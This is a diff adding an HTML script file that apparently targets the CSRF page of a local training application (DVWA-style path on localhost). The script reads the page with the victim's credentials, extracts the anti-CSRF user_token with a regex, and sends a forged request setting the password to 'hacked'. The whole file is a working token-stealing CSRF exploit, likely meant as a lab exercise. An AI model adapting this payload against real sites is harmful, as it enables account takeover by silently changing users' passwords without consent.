@@ -1,0 +1,26 @@
+<script>
+var url="http://localhost:88/vulnerabilities/csrf/"
+var xhttp = new XMLHttpRequest();
+var token = 0;
+console.log("script running");
+xhttp.withCredentials = true;
+xhttp.onreadystatechange = function() {
+    if (this.readyState == 4 && this.status == 200) {
+       // now we look for the user_token in the response
+       // it looks like name='user_token' value='85956016549e887bae173b077e1d7f76'
+       var text = xhttp.responseText;
+       var regex = /user_token\' value\=\'(.*?)\' \/\>/;
+       var match = text.match(regex);
+       var token = match[1];
+       var pass="hacked";
+       //now we send the forged request
+       var new_url = 'http://localhost:88/vulnerabilities/csrf/?user_token='+token+'&password_new='+pass+'&password_conf='+pass+'&Change=Change'
+       alert('Got token:' + token);
+       xhttp.open("GET", new_url, false );
+       xhttp.send();
+    }
+};
+xhttp.open("GET", url, false);
+xhttp.send();
+</script>
+
